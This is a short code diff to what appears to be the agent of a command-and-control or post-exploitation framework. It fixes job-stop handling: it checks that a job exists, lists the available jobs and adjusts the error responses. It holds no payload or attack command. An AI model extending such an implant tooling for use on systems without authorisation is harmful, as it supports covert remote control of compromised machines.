@@ -561,6 +561,16 @@ class MainAgent:
         Task 51
         """
         try:
+            # Check if the job exists
+            if job_to_kill not in self.tasks:
+                available_jobs = ", ".join(str(k) for k in self.tasks.keys())
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        0, "[!] Job %s not found. Available jobs: %s" % (job_to_kill, available_jobs), result_id
+                    )
+                )
+                return
+
             if self.tasks[job_to_kill]['task_thread'].is_alive():
                 self.tasks[job_to_kill]['task_thread'].kill()
                 self.tasks[job_to_kill]['status'] = "stopped"
@@ -578,15 +588,15 @@ class MainAgent:
                     )
                 )
 
-            self.tasks[result_id]["status"] = "completed"
+            # Note: STOPJOB tasks are not background jobs, so we don't track them in self.tasks
 
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    51, "[!] Error stopping job thread: %s" % (e), result_id
+                    0, "[!] Error stopping job thread %s: %s" % (job_to_kill, e), result_id
                 )
             )
-            self.tasks[result_id]["status"] = "error"
+            # Note: STOPJOB tasks are not background jobs, so we don't track them in self.tasks
 
     def dynamic_code_execute_wait_nosave(self, data, result_id):
         """
